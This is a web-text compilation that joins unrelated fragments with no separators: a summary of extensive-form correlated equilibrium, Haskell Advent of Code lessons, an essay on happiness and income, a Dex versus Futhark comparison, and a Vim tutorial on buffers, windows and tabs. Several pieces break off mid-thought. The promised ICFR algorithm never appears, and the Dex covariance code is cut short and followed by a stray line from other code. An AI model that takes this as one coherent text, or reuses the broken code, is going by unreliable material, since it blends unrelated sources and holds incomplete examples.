				<div><p>However, this theory assumes that interaction among the players is decentralized, which brings us to the conclusion that Nash Equilibrium is a distribution on the <strong>uncorrelated</strong> strategy space. The variation of this theory – <strong>Correlated Equilibrium</strong> assumes that general distribution over joint action profiles is modeled via an external <strong>mediator</strong>. This mediator, privately recommends to each player her next best action. The extension of this theory is called <strong>extensive-form correlated equilibrium (EFCE)</strong> and it is especially useful in sequential strategic interactions. According to this theory, the mediator at the beginning of the interaction gathers all possible recommendations for each step of the sequential interaction. However, she <strong>incrementally</strong> reveals relevant individual moves as the player reaches the step. At each step, the player can accept the mediator’s recommendation or disregard it, but by doing so recommendations are no longer provided for her.</p>
<p>Authors focus on a specific setting – general-sum extensive-form games with an arbitrary number of players. In practice, there is no effective way to solve <strong>EFCE</strong> for this setting. So, the authors essentially showed that is it possible to <strong>devise</strong> simple dynamics that leading to a feasible <strong>EFCE</strong>. They do so by introducing several notions. The first notion is the triggering agent. <strong>Trigger agent</strong> for player i is an agent that takes on the role of player and commits to following all recommendations unless she reaches action <em>I</em> and gets recommended to play action <em>a</em>. If this happens, the player <strong>stops</strong> committing to the recommendations and plays according to a plan until the game ends. Based on this notion of the trigger regret is defined. Trigger regret measures the regret that each trigger agent has for not having played the best-in-hindsight strategy. This is internal regret because it represents cumulative internal regret of player up to iteration <em>T</em>.</p>
<p>Finally, the authors provide an algorithm, called <strong>ICFR</strong>. This is the regret minimization algorithm that minimizes trigger agent regrets via the decomposition of these regrets locally at each information set. That algorithm looks like this:</p></div>

<p>After many years of trying unsuccessfully, I finally completed all 25 days of the <a href="https://adventofcode.com/2020/">Advent of Code 2020</a> in Haskell. Here is a summary of my learnings and solutions.</p>

<h2 id="learnings">Learnings</h2>

<ul>
  <li>GHCi is a powerful REPL. We can do almost anything in it which we can do in a file. It is also fast and great to play with code.</li>
  <li><a href="http://learnyouahaskell.com/zippers">Zippers</a> are an awesome technique to move around in a data structure. We can also think of them as focus points in spaces like lines, plains or 3D volumes. Many AoC problems are about moving around in space, doing things at the focus points. Zippers are quite suitable for such problems.</li>
  <li><a href="https://hackage.haskell.org/package/split/docs/Data-List-Split.html">Data.List.Split</a> module is good enough for basic input parsing.</li>
  <li>It is trivially easy to write a simple but feature-rich parser framework in Haskell. <a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-7">Here</a> is one in its entirety, with some example parsers, in just 24 lines.</li>
  <li><a href="https://hackage.haskell.org/package/graph-wrapper/docs/Data-Graph-Wrapper.html">Data.Graph.Wrapper</a> is a useful wrapper over <a href="https://hackage.haskell.org/package/containers/docs/Data-Graph.html">Data.Graph</a>.</li>
  <li>Haskell is good for writing interpreters.</li>
  <li>Graph traversal + Memoization = Dynamic programming.</li>
  <li>Use <a href="https://hackage.haskell.org/package/MemoTrie/docs/Data-MemoTrie.html">Data.Memotrie</a> for side-effect-free memoization in Haskell.</li>
  <li>Sometimes it’s faster to recompute than to memoize because of the lazy nature of Haskell and the extra memory usage caused by memoization.</li>
  <li><a href="https://hackage.haskell.org/package/comonad">Comonads</a> are great to simulate <a href="https://en.wikipedia.org/wiki/Cellular_automaton">Cellular automata</a>. Zippers are comonads.</li>
  <li>Comonad based cellular automata do not mutate the state of the automata universe, neither do they compute and materialize the whole universe at every step of the automata. Rather, they just stack functions over functions to create new lazy views over the original universe. This means that we can have lazy infinite universes. This also means that simulating cellular automata using comonads tends to get slower with increasing number of neighbours/dimensions.</li>
  <li>Sometimes mutability is the only option if we want to implement a fast algorithm. Mutable vectors from the <a href="https://hackage.haskell.org/package/vector">vector</a> library are great for this.</li>
  <li>Writing the <a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-17">four-dimensional zipper comonad</a> from scratch is complex and takes a really long time.</li>
  <li><a href="https://english.stackexchange.com/questions/56472/x-y-z-horizontal-vertical-and">There are no words</a> similar to <em>horizontal</em> and <em>vertical</em> for three dimensions or more.</li>
  <li><a href="https://hackage.haskell.org/package/base/docs/Text-ParserCombinators-ReadP.html">ReadP</a> is a good, minimal and easy to use parser framework which is included in the Haskell standard library.</li>
  <li>Try to use <a href="https://en.wikipedia.org/wiki/Bit_array">Bit arrays</a> when they fit, for performant solutions.</li>
  <li>Some problems, when scaled up, cannot be solved with lazy lists in a reasonable time.</li>
  <li>We can simulate a linked list of integers over a vector.</li>
  <li>If a program generates a lot of garbage, turning on multithreading (<code>-threaded</code>) and parallel garbage collection (<code>-qg0 -N</code>) may make it run faster.</li>
  <li>Tweaking the heap size (<code>-H</code>) and the allocation area size (<code>-A</code>) may make a program run faster.</li>
  <li>Use the <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/glasgow_exts.html#extension-Strict"><code>Strict</code></a> extension cautiously. Sometimes it may unexpectedly make a program run slower.</li>
  <li><a href="https://www.youtube.com/watch?v=thOifuHs6eY">Hexagons are the bestagons</a>.</li>
</ul>

It goes something as the following. Sometime over the past four to five decades, we moved into an economy that absolutely doesn't help the working men and women. As a result prices for essentials have soared beyond all recognition, income has fallen for labour, it has fallen even further for those lower down the wealth scale, and most of the gains have all gone to the top 1%.</p><p>But one piece of insight stays inside this tale of woe much like grit in an oyster. It's the fact that annoyingly, a large enough proportion also claim to be happier than they were before.</p><p>What gives?</p><p>For one thing, the self reported life satisfaction in most countries hasn't dropped all that much. Looks like through the biggest financial crisis of around a century and the best boom times before where every stripper seemed to have briefly <a href="https://latimesblogs.latimes.com/money_co/2007/06/tuesday-morning-tales-from-the-bubble----how-a-22-year-old-stripper-bought-10-houses.html">become a real estate mogul</a>, the overall life satisfaction was ... curiously flat?What if we go further back in time?</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ff7702180-6412-4ef9-89ce-59e1b082aa7a_781x485.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ff7702180-6412-4ef9-89ce-59e1b082aa7a_781x485.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/f7702180-6412-4ef9-89ce-59e1b082aa7a_781x485.png&quot;,&quot;height&quot;:485,&quot;width&quot;:781,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>What if we go further back in time?   </p><p>The map looks slightly more complex, but not by a lot.

I mean, Latin America seems oddly happy with all the coups and currency crises and jaguars roaming over there, but they're not off the charts. Looks like with some minor variation everyone seems to be on the same page.</p><p>So why is everyone so damn happy?</p><h2>II</h2><p>An article in the New York Times by Steven Quartz and Anette Asp called <a href="https://www.nytimes.com/2015/04/12/opinion/sunday/unequal-yet-happy.html">Unequal Yet Happy</a> makes this case.</p><blockquote><p>For most of human history, inequality of wealth meant inequality of happiness. Status, and its related activities, envy and emulation, drove consumption. By the 1950s, rapidly rising standards of living across the West, combined with social pressures to conform, all conspired to intensify status competition. The architects of “rebel cool,” like Jack Kerouac and Norman Mailer, responded by rebelling against emulation consumption and the status hierarchy of postwar America. They inverted the dominant social hierarchy, rejecting the values of those at the top and appropriating the values of those who had been marginalized at the bottom.</p><p>This trade-off comes at a political price, as it makes income inequality less emotionally salient. In a 2013 poll asking Americans to name the most important problems facing the country, only 5 percent cited income inequality or concerns about the poor or middle class (though a recent Gallup poll did find that 67 percent of Americans were dissatisfied with the current income distribution). Politicians from Senator Elizabeth Warren on the left to Representative Paul D. Ryan on the right are talking about inequality, but President Obama has lately been talking more about “opportunity.”</p><p>The proliferation of consumer choice helps explain why today’s Gilded Age hasn’t sparked as much outrage as the last one. Money may not buy happiness in the long run, but consumer choice has gone a long way in keeping most Americans reasonably content, even if they shouldn’t be.</p></blockquote><p>It essentially says that while yeah, we all hate the fact that getting sick costs a bomb, having a roof over your head is crazy expensive, and getting an education means mortgaging your whole life, but as long as you're not being actively crushed under that pressure, life's pretty great. There's Netflix ! And you can even travel anywhere you like - the airplane industry obligingly hasn't turned a profit in decades.</p><p>Is that the answer then? We're so happy with the consumer devices we carry around in our pockets that even though we don't make as much money and life's much harder, we don't care.</p><p>Chalk one up to the awesomeness of the iPhone.</p><p>But in a completely unsurprising addendum to the overall picture, turns out people are more satisfied with their life when they make more money.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Faa0b3321-c20d-42b8-83bd-45dd56610d88_3000x2100.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Faa0b3321-c20d-42b8-83bd-45dd56610d88_3000x2100.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/aa0b3321-c20d-42b8-83bd-45dd56610d88_3000x2100.png&quot;,&quot;height&quot;:1019,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>So there is an unmistakable and very strong correlation across income and happiness across most countries.

He said, looking at the time when satisfaction stagnated in the US between 1946 and 1970, that while richer countries have higher happiness levels, the growth rates in the happiness levels in richer countries didn't seem to be keeping pace with the increase in national incomes.

Could it be that the growth that we're seeing in GDP comes primarily from growth in population? That would mean that that while GDP is growing, it's doing so because there are just more people. They can't all be equally happy at something they made come about by the difficult feat of being born.</p><p>To quote from <a href="https://www.pnas.org/content/107/52/22463">his paper</a>:</p><blockquote><p>Simply stated, the happiness–income paradox is this: at a point in time both among and within nations, happiness varies directly with income, but over time, happiness does not increase when a country's income increases. We are talking here about the time series relationship of happiness and income in the long term, usually at least 10 years, sometimes more. As we shall see, the short-term relationship is a different story.</p></blockquote><p>This though only seemed to hold across countries as in the charts above. And it's not a linear relationship by any means, more of a trend seen from above. Just growing doesn't seem to be enough to get people happy.</p><p>The problem with the charts above is that they're point-in-time snapshots, and even the ones that seem to draw trends from one time to another seem to pick few datapoints rather than do even a cursory p-hack.</p><p>And the argument that Easterlin et al advance is that in the long run, a higher rate of economic growth by itself does not result in a greater increase in happiness.</p><p>The plot thickens.</p><h2>III</h2><p>The answer it seems, as is so often the case, comes from unpacking the "average" that's measured into it's component distribution.</p><p>Take the US for instance. The answer is not that people have gotten unhappier in the US in aggregate, or even in average. It's that while there has been modest growth in incomes over this period, it's barely kept pace, which means that the happiness index has been (at best) flat. While this isn't true if you do that graph solely for the top 1% in the income percentile, they don't seem to matter enough to sway this particular graph. While they do matter enough to sway the average income and GDP per capita graphs.</p><blockquote><p><a href="https://www.pnas.org/content/107/52/22463">This article</a> also contributes unique systematic evidence for developing and transition countries that short-term contractions and expansions are accompanied by corresponding movements in subjective well-being. Thus, in the short term, happiness and SWB are positively related, but over the long term—here, usually a minimum period of 10 y—the relationship is nil. The happiness–income paradox now holds for countries ranging from poor to rich: among countries, at a point in time happiness and income are positively related, but over time within a country, happiness does not increase as income goes up.</p><p>Consider, for example, three countries included here with very high recent growth rates of GDP—China, South Korea, and Chile. China's growth rate implies a doubling of real per capita income in less than 10 y; South Korea's, in 13 y; and Chile's, in 18 y. With the real per capita amount of goods multiplying so rapidly in a fraction of a lifetime, one might think many of the people in these countries would be so happy, they'd be dancing in the streets. Yet both China and Chile show mild (not statistically significant) declines in life satisfaction</p></blockquote><p>What this seems to indicate is that the impact of change in economic circumstances takes time to get ossified into the societal structures which (not too rapidly) increases satisfaction. So what does make people happy, or at least satisfied with their life? It's like a combination of a current reality metric and a future expectation metric. You need to feel like life's pretty good right now and also that it will continue to get better.</p><p>Easterlin also spoke about something quite similar. That our expectations from life grows as time goes on and incomes increase, so …</p></div></div>

</p>

<p><a href="https://github.com/google-research/dex-lang">Dex</a> is a functional array programming language developed by a team of researchers at Google. I recently re-read <a href="https://openreview.net/pdf?id=rJxd7vsWPS">their paper</a>, which got me excited enough to want to take a closer look. Dex and Futhark are more or less aimed at the same kinds of problems, so my interpretation of Dex is rooted in how it differs from Futhark. In this post I will describe some of the interesting differences based on <a href="https://futhark-lang.org/examples.html#examples-from-dex">translating five Dex example programs to Futhark</a>. I’m not a Dex expert, so maybe I’ve missed a thing here or there.</p>
<p>Futhark wasn’t originally designed to be a user-facing programming language. We were doing research in compiler optimisations for parallel computers, and the language was just a crude little thing so we could write programs for our optimiser to work on. Over time the language grew and eventually became fairly pleasant to use (<a href="https://futhark-lang.org/blog/2017-12-27-reflections-on-a-phd-accidentally-spent-on-language-design.html">full story here</a>), but it was still never designed as a cohesive or novel approach to array programming. That also means it’s fairly conventional or even old-fashioned, as functional languages go. In contrast, Dex’s authors had more imagination and designed their language from the start with novel ideas, chief of which is to consider <em>index sets as types</em>. To illustrate the idea, here is how to compute all-pairs L₁ distances in Dex:</p>
<pre><code>pairwiseL1 ::  n=&gt;d=&gt;Real -&gt; n=&gt;n=&gt;Real
pairwiseL1 x = for i j.sum (for k. abs (x.i.k - x.j.k))</code></pre>
<p>The <code>n=&gt;d=&gt;Real</code> is the type of an <code>n</code> by <code>d</code> array of <code>Real</code>s. Dex leans heavily on an analogy between arrays and functions, as arrays can be seen as merely functions from indexes to values. In Futhark, we’d write this type as <code>[n][d]Real</code>. Note that in Dex, <code>n</code> and <code>d</code> are completely abstract type parameters, while in Futhark they are term-level variables.</p>
<p>The real advantage of Dex’s approach is that it permits a very lightweight notation for index spaces. For example, <code>for i j.e</code> produces a two-dimensional array where each element is given by the expression <code>e</code>, and the type checker figures out the span of <code>i</code> and <code>j</code> based on the context. For example, in <code>for k</code>, Dex figures out that <code>k</code> must be part of the index set <code>d</code>, because it is used to index the innermost dimension of <code>x</code>. Pretty cool!</p>
<p>A naive translation to Futhark would be this:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>let</span> pairwiseL1 [n][d] (x: [n][d]f64) =</span>
<span id="cb2-2">  tabulate_<span>2</span>d n n (\i j -&gt; f64.sum (tabulate d (\k -&gt; x[i,k] - x[j,k])))</span></code></pre></div>
<p>Note that the tabulation functions require explicit size-passing, and that the indexes are just integers - the type checker will not help us if we accidentally use the <code>k</code> along the wrong dimension.</p>
<p>Of course, the above is not how you’d actually write this program in Futhark. Instead you’d first define a function for computing the L₁ distance:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>let</span> L1 [n] (xs: [n]f64) (ys: [n]f64) : f64 =</span>
<span id="cb3-2">  map2 (-) xs ys |&gt; map f64.abs |&gt; f64.sum</span></code></pre></div>
<p>And then you’d apply it to all the pairs:</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>let</span> pairwiseL1 [n][m] (xss: [n][m]f64) : [n][n]f64 =</span>
<span id="cb4-2">  map (\a -&gt; map (\b -&gt; L1 a b) xss) xss</span></code></pre></div>
<p>I think this program illustrates the main difference in philosophy between Dex and Futhark. While Dex uses dependent types to secure an index-based notation, Futhark instead encourages index-free programming. I suspect the two approaches are fundamentally equivalent, but it’s an interesting contrast that I think is due to the two language’s different backgrounds. Dex is specifically designed to implement scientific code and formulae, which is traditionally very index-oriented. Futhark is more about supporting a “traditional” combinator-based functional programming style, but just making it run much faster. You could view Futhark as a data-parallel ML, while Dex is <a href="https://en.wikipedia.org/wiki/Einstein_notation">higher-order dependently typed Einstein summation</a>.</p>
<p>I also suspect this focus on indexes is because the Dex authors have a background of being frustrated with NumPy-style programming, where the absence of efficient indexing can be quite restrictive. They even even use this NumPy implementation of L₁ distances as motivation in their paper:</p>
<pre><code>def pairwiseL1(x):
  return sum(abs(x.T - x[..., newaxis]), axis=1)</code></pre>
<p>I certainly agree that this is hard to read.</p>
<h2 id="the-good-ones"><a href="#the-good-ones" id="the-good-ones-link" title="the-good-ones">The good ones</a></h2>
<p>Porting a two-line Dex program to Futhark is enough to wax philosophically for a paragraph or two, but it’s still a pretty shallow comparison. Therefore, I also ported five of <a href="https://github.com/google-research/dex-lang/tree/main/examples">the Dex example programs</a>, plus whatever of the <a href="https://github.com/google-research/dex-lang/blob/main/lib/prelude.dx">Dex prelude</a> I needed along the way. I’m not going to claim that I ported the five most difficult programs, but at least one of them was quite complicated. The Futhark programs total about 450 lines of code (excluding comments and blanks).</p>
<p>My general impression is that when it comes to expressing parallelism, Dex and Futhark are about equivalent. Dex’s index notation is more concise, but I personally find it slightly easier to understand and decompose Futhark expressions. As an example, this Dex function computes the covariance of a matrix:</p>
<pre><code>def covariance (n:Type) ?-&gt; (d:Type) ?-&gt;
    (xs:n=&gt;d=&gt;Float) : (d=&gt;d=&gt;Float) =
   xsMean :    d=&gt;Float = (for i. sum for j. xs.j.i) / IToF (size n)
   xsCov  : d=&gt;d=&gt;Float = (for i i'. sum for j.
                           (xs.j.i' - xsMean.i') *
                           (xs.j.i  - xsMean.i )   ) / IToF (size n - 1)

<span id="cb7-10">          xsT means</span></code></pre></div>
<p>It’s certainly more verbose, but I had to read the Dex function carefully to understand what the indexes implied, while I have a much easier time understanding the structure of the computation from the Futhark formulation. Of course, I also have years of experience with Futhark, compared to just days with Dex.</p>
<p>Most of the translations were pretty simple, for example the <a href="https://futhark-lang.org/examples/dex-mandelbrot.html">Mandelbrot set</a>, <a href="https://futhark-lang.org/examples/dex-pi.html">Monte Carlo pi</a>, and <a href="https://futhark-lang.org/examples/dex-brownian-motion.html">Brownian motion</a> programs. One difference that made me feel <em>major</em> jealousy is that the <code>dex script</code> command is also able to generate <a href="https://google-research.github.io/dex-lang/mandelbrot.html">pleasant reports</a> containing both the code and visualisations and plots of various values. We definitely need a tool like this for Futhark!</p>
<p>The <a href="https://futhark-lang.org/examples/dex-sierpinski.html">Sierpinski triangle</a> program has a fun little detail in Dex, which is that the <code>randIdx</code> function uses the Dex type system to determine the range of the index being produced. While the <code>randIdx</code> function itself can still be wrong, this makes it hard to <em>use</em> it incorrectly. The Futhark translation of <code>randIdx</code> asks the user to pass in a range explicitly, and also returns just an integer.</p>
<h2 id="the-bad-one"><a href="#the-bad-one" id="the-bad-one-link" title="the-bad-one">The bad one</a></h2>
<p>The largest ported example by far is <a href="https://futhark-lang.org/examples/dex-raytrace.html">a ray tracer</a>. It uses ray marching with <a href="https://en.wikipedia.org/wiki/Signed_distance_function">signed distance functions</a> to describe objects. The Dex program rather casually uses the <code>grad</code> operator to apply <a href="https://en.wikipedia.org/wiki/Automatic_differentiation">automatic differentiation (AD)</a> to compute surface normals from the distance function. This is a really elegant technique, but Futhark does not (yet!) have a <code>grad</code> operator. In Futhark, the sensible thing to do is to hard-code the gradient functions for the three different kinds of objects, so of course I instead used <a href="https://futhark-lang.org/examples/dual-numbers.html">forward-mode AD with dual numbers</a> implemented via the Futhark module system. The resulting code finally convinced me that built-in AD is a necessity for a modern numerical languages. I was on the fence before, since I worry that doing it well will be invasive in both the language and compiler, but I never want to write this kind of boilerplate again.</p>
<p>The rest of the ray tracer was fairly straightforward to implement. Dex uses its effect system to implement the loop where the lights in the scene apply their contributions to a given point, which I wrote in Futhark as basically a fold. In fact, I didn’t yet find a Dex example where the effect system was more than a small notational convenience. I’m sure there’s one, though! Effect systems are not things you just add on a lark.</p>
<p>There was one part that confused me initially, but which makes perfect sense in retrospect. The ray tracer normalises the intensity of all pixels (triples of floats) based on the average intensity (unusual I think, but fine). In Dex this is done like this:</p>
<pre><code>image / mean (for (i,j,k). image.i.j.k)</code></pre>
<p>When I first read this, I couldn’t figure out whether it was normalising <em>per channel</em>. I always get a bit wary when overloaded operators like that <code>/</code> are involved. Of course, that <code>for</code>-expression is over a <em>single</em> index that just happens to be a triple, and the components of which are then used to index the three-dimensional <code>image</code> array. It’s really just flattening the array, and the type checker makes the individual <code>i</code>, <code>j</code> and <code>k</code>s take on the appropriate value.</p>
<h2 id="conclusions"><a href="#conclusions" id="conclusions-link" title="conclusions">Conclusions</a></h2>
<p>With respect to expressing parallelism, Dex and Futhark seem equivalent in expressive power, but Dex has the edge in concision. I’d be curious about going the other way, and porting some of the original Futhark benchmark programs <em>to</em> Dex, like <a href="https://github.com/diku-dk/futhark-benchmarks/blob/master/finpar/LocVolCalib.fut">local volumetric calibration</a>.</p>
<p>Dex has several small conveniences over Futhark: while the effect system didn’t matter much for the examples I looked at, Dex’s type classes and broadcasting operators did help a bit with making things more concise.</p>
<p>If you need AD, then Dex is miles ahead of Futhark. While I managed to implement the surface normals in the ray tracer, I gave up on porting <a href="https://google-research.github.io/dex-lang/mcmc.html">mcmc.dx</a> because it contains a higher-order function that applies the <code>grad</code> operator to a functional argument. This would have to be implemented with a higher order parametric module (<a href="https://futhark-lang.org/blog/2019-12-18-design-flaws-in-futhark.html#higher-order-modules">which I wrote were useless not long ago</a>), but I just didn’t have the heart for it. I’ll keep this as a usage case for when we implement AD properly.</p>
<p>I didn’t look much at performance, since Dex is sparsely documented and the benchmarking tools seem to be mostly for internal use. I performed a rough timing of sequential execution of the ray tracer, where the Futhark and Dex versions are about equally fast. Dex also has multi-threaded and CUDA backends, but I …</p></div></div>

            <p>Welcome to the second part of this series aimed to make you a better Vim user! If you have no idea about Vim, you should begin with <a href="https://thevaluable.dev/vim-for-beginners/" target="_blank" rel="noopener">the first part</a>. In this article, I’ll explain many more concepts, some of them making Vim truly special compared to other editors. Who wasn’t blown away discovering Vim’s macros?</p>
<p>Specifically, we’ll see together:</p>
<ul>
<li>Ways you can organize open files in Vim using buffers, windows, tabs, and the argument list.</li>
<li>Useful motions to jump quickly from one place to another in your entire codebase.</li>
<li>Mapping new keystrokes to old keystrokes or commands.</li>
<li>Powerful functionalities to repeat some of your keystrokes.</li>
<li>Ways of manipulating the command line history.</li>
<li>Plugins which offers different ways to manage some ideas we saw before.</li>
</ul>
<p>The amount of information in this article can feel overwhelming. My advice: take your time and don’t try to swallow everything at once. Experiment with Vim as you read along, try to understand how it works, and you’ll have a powerful tool you can control entirely with your keyboard.</p>


  






    









<p>You’ll see at the end of each sections some related Vim’s help commands. You can read these help sections directly in Vim when you’re ready to dive deeper.</p>
<h2 id="vims-spatial-organization">Vim’s Spatial Organization</h2>
<p>If you’re using an IDE, you’re certainly used to manage your files with tabs. Vim use other ways to represent and organize open files. Indeed, there are four <a href="https://thevaluable.dev/abstraction-type-software-example/">layers of abstraction</a> you can use for that: the <em>buffers</em>, the <em>windows</em>, the <em>tabs</em>, and the <em>argument list</em>.</p>
<h3 id="buffers">Buffers</h3>
<p>A <em>buffer</em> directly match an open file in memory. To make a comparison with a standard IDE, a buffer would be the <em>content</em> of a tab. The big difference: when you close a tab in an IDE, you close the file as well. Not in Vim; if you close a window containing a buffer, the buffer is still there, <em>hidden</em>.</p>
<p>In fact, a buffer can have three different states:</p>
<ul>
<li><em>active</em> - The buffer is displayed in a window.</li>
<li><em>hidden</em> - The buffer is not displayed, but it exists and the file is still open.</li>
<li><em>inactive</em> - The buffer is not displayed and <em>empty</em>. It’s not linked to any file.</li>
</ul>
<p>The content of a file in a hidden buffer is not directly visible in Vim. At that point, you might wonder: how do we know that this buffer is still open, if we can’t see it?</p>
<p>To see all opened buffered, we can look at the <em>buffer list</em>. You can use the command <code>:buffers</code> to display it. Each line contains:</p>
<ol>
<li>The buffer unique ID.</li>
<li>Indicators displaying different informations (for example <code>a</code> for active, <code>h</code> for hidden, or <code> </code> (space) for inactive).</li>
<li>The name of the buffer, if any. It can be the filepath of the file linked to the buffer.</li>
<li>The line number where the cursor is.</li>
</ol>
<p>For example: <code>27  %a   "layouts/shortcodes/notice.html" line 18</code> means that the buffer ID 27 is in state <code>a</code> (active), its name is <code>layouts/shortcodes/notice.html</code> and the cursor in this specific buffer is on line 18. You can as well know what’s the current buffer displayed with the flag <code>%</code> just before its state.</p>
<p>To navigate through the buffer list, you can use these commands:</p>
<ul>
<li><code>:buffer &lt;ID_or_name&gt;</code>- Move to the buffer using its ID or its name.</li>
<li><code>:bnext</code> or <code>:bn</code> - Move to the next buffer.</li>
<li><code>:bprevious</code> or <code>:bp</code> - Move to the previous buffer.</li>
<li><code>:bfirst</code> or <code>:bf</code> - move to the first buffer.</li>
<li><code>:blast</code> or <code>:bl</code> - move to the last buffer.</li>
<li><code>CTRL-^</code> - switch to the alternative buffer. It’s indicated in your buffer list with the symbol <code>#</code>.</li>
<li><code>&lt;ID&gt;CTRL-^</code> - Switch to a specific buffer with ID <code>&lt;ID&gt;</code>. For example, <code>75CTRL-^</code> switch to the buffer with ID 75.</li>
</ul>
<p>You can as well apply a command to all buffers using <code>:bufdo &lt;command&gt;</code>.</p>
<p>Not all buffers are displayed in the buffer list. To display unlisted buffers, you can use the command <code>:buffers!</code> or <code>ls!</code>. You’ll see unlisted buffer with an indicator <code>u</code> just after its ID.</p>
<p>Now, let’s ask this existential question: how can we create buffers?</p>
<ul>
<li>If you create a window, a buffer will be created automatically (see below).</li>
<li><code>:badd &lt;filename&gt;</code> - Add <code>&lt;filename&gt;</code> to the buffer list.</li>
</ul>
<p>If we can create buffers, we should be able to delete them:</p>
<ul>
<li><code>:bdelete &lt;ID_or_name&gt;</code> - Delete a buffer by ID or name. You can specify more than one ID or name separated with spaces to delete multiple buffers.</li>
<li><code>:1,10bdelete</code> - Delete buffers from ID 1 to 10 included.</li>
<li><code>:%bdelete</code> - Delete all buffers.</li>
</ul>
<p>If you modify a file, forget to save it, and close the window making the buffer hidden, you won’t be able to quit Vim. It will complain that you’re hidden buffer is not saved; to get around that, I would recommend to set the option hidden in your vimrc (by default <code>~/.vimrc</code>), as follow:</p>
<pre><code>set hidden
</code></pre><p>You can try it directly in your current session by running the command <code>:set hidden!</code> to toggle the option on and off. You can play around with it and see what suits best for you.</p>
<p>To see the value of any option, you can use a question mark. For example: <code>:set hidden?</code> or <code>:set filetype?</code>.</p>


  




    





  

<div>
    
    <div>
         <ul>
<li><code>:help buffers</code></li>
<li><code>:help :buffers</code></li>
</ul>
 
    </div>
</div>



<h3 id="windows">Windows</h3>
<p>A window in Vim is nothing more than a space you can use to display the content of a buffer. Don’t forget: when you close the window, the buffer stays open.</p>
<p>When you open Vim, one window with one empty buffer are automatically created.</p>
<p>To create windows, you can use the <code>:new</code> command, or one of these keystrokes:</p>
<ul>
<li><code>CTRL-W s</code> - Split the current window horizontally.</li>
<li><code>CTRL-W v</code> - Split the current window vertically.</li>
<li><code>CTRL-W n</code> - Split the current windows horizontally and edit a new file.</li>
<li><code>CTRL-W ^</code> - Split the current with the <em>alternate file</em> (buffer with the <code>#</code> indicator in your buffer list).</li>
<li><code>&lt;buffer_ID&gt;CTRL-W ^</code> - Split windows with the buffer of ID <code>&lt;ID&gt;</code>. For example, <code>75 CTRL-W ^</code> will open a window with the buffer of ID 75.</li>
</ul>
<p>To move your cursor from one window to another, you can use:</p>
<ul>
<li><code>CTRL-W &lt;Down&gt;</code> or <code>CTRL-W j</code></li>
<li><code>CTRL-W &lt;Up&gt;</code> or <code>CTRL-W k</code></li>
<li><code>CTRL-W &lt;Left&gt;</code> or <code>CTRL-W h</code></li>
<li><code>CTRL-W &lt;right&gt;</code> or <code>CTRL-W l</code></li>
</ul>
<p>You always dreamt to move the windows? Me too. Here’s how to do it:</p>
<ul>
<li><code>CTRL-W r</code> - Rotate the windows.</li>
<li><code>CTRL-W x</code> - Exchange with the next window</li>
</ul>
<p>Who wants windows without being able to resize them? Here are the keystrokes you need:</p>
<ul>
<li><code>CTRL-W =</code> - Resize windows for them to fit on the screen with the same size.</li>
<li><code>CTRL-W -</code> - Decrease window’s height.</li>
<li><code>CTRL-W +</code> - Increase window’s height.</li>
<li><code>CTRL-W &lt;</code> - Decrease window’s width.</li>
<li><code>CTRL-W &gt;</code> - Increase window’s width.</li>
</ul>
<p>Using these keystrokes to move the cursor from window to window and to move the windows themselves is pretty tedious . We’ll see later a plugin which can help to make the whole operation smoother.</p>
<p>If you want to quit windows, you can use the commands:</p>
<ul>
<li><code>:q</code> - To <code>q</code>uit the current window. People lied to you! <code>:q</code> doesn’t quit Vim, but a window. You quit Vim only if there is only one window open.</li>
<li><code>:q!</code> - To <code>q</code>uit the current window, even if there is only one window open with an unsaved buffer<code>!</code>.</li>
</ul>


  




    





  

<div>
    
    <div>
         <ul>
<li><code>:help windows</code></li>
<li><code>:help opening-window</code></li>
<li><code>:help window-move-cursor</code></li>
<li><code>:help window-moving</code></li>
<li><code>:help window-resize</code></li>
</ul>
 
    </div>
</div>



<h3 id="tabs">Tabs</h3>
<p>We saw that a buffer is an open file, and a window is the container for an active buffer. We can see tabs as a container for a bunch of windows. In that way, it’s very different than the concept of tabs in a standard IDE!</p>
<p>Here are the commands to create and delete tabs:</p>
<ul>
<li><code>:tabnew</code> or <code>:tabe</code> - Open a new tab.</li>
<li><code>:tabclose</code> or <code>:tabc</code> - Close the current tab.</li>
<li><code>:tabonly</code> or <code>:tabo</code> - Close every other tab except the current one.</li>
</ul>
<p>To move from tab to tab, you can use these keystrokes:</p>
<ul>
<li><code>gt</code> - <code>g</code>o to the next <code>t</code>ab.</li>
<li><code>gT</code> - <code>g</code>o to the previous tab.</li>
</ul>
<p>You can as well add a count before the last two keystrokes. For example, <code>1gT</code> go to the first tab. Yep, tabs are indexed from 1.</p>


  




    





  





<h3 id="argument-list-arglist">Argument List (arglist)</h3>
